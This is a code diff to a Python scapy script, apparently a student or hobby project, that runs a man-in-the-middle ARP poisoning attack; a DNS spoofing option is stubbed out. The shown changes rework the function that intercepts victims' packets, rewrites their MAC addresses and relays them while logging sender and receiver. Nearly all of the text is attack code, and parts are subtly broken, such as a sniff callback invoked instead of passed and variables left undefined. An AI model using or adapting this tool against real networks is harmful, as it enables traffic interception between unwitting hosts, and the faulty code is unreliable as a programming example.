@@ -7,13 +7,14 @@ from scapy.all import *
 
 # The main method to be ran by the user of our script
 def main():
-       typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
-       if (typeOfAttack == 1):
-           arppoison()
-       elif (typeOfAttack == 2):
-           #dnsSpoof()
-       else:
-           print("No or wrong input.")
+    typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
+    if (typeOfAttack == 1):
+        arppoison()
+    elif (typeOfAttack == 2):
+        print("This function has not been implemented yet.")
+		#dnsSpoof()
+    else:
+        print("No or wrong input.")
 
 def arppoison():
     # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
@@ -69,7 +70,7 @@ def arppoison():
         sendp(arp2, iface="enp0s3")
         
         # Call sniff to start sniffing for incoming packets from victims, and resend packets received via forward_packet
-        sniff(prn=forward_packet(packet, macVictimList, ipVictimList, macAttacker), iface = "enp0s3")
+        sniff(prn=forward_packet(packet), iface = "enp0s3")
 
         # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
         while(True):
@@ -84,16 +85,23 @@ def arppoison():
 
     
 # This method is used to forward the received packet we sniffed to the host it was intended to be sent to
-def forward_packet(packet, macVictimList, ipVictimList, macAttacker):
-    for i in len(ipVictimList):
-        if (packet[IP].dst == ipVictimList[i] and packet[Ether].dst == macAttacker):
+def forward_packet(packet):
+        if (packet[IP].dst == ipVictimList[1] and packet[Ether].dst == macAttacker):
             # Once we have the IP address of the destination, we must change the MAC address to what it should have been if it was not spoofed
-            packet[Ether].dst = macVictimList[i]
+            packet[Ether].dst = macVictimList[1]
             # We also change the source MAC address to the attacker's MAC address so we can listen in on the response
             packet[Ether].src = macAttacker
             # Resend the packet to it's rightful destination
             sendp(packet)
+            print("A packet from " + str(packet[IP].src) + " has been redirected to " + str(packet[IP].dst))
 
+        if (packet[IP].dst == ipVictimList[0] and packet[Ether].dst == macAttacker):
+            # Once we have the IP address of the destination, we must change the MAC address to what it should have been if it was not spoofed
+            packet[Ether].dst = macVictimList[0]
+            # We also change the source MAC address to the attacker's MAC address so we can listen in on the response
+            packet[Ether].src = macAttacker
+            # Resend the packet to it's rightful destination
+            sendp(packet)
             # Let the attacker know who sent a packet to whom
             print("A packet from " + str(packet[IP].src) + " has been redirected to " + str(packet[IP].dst))
 
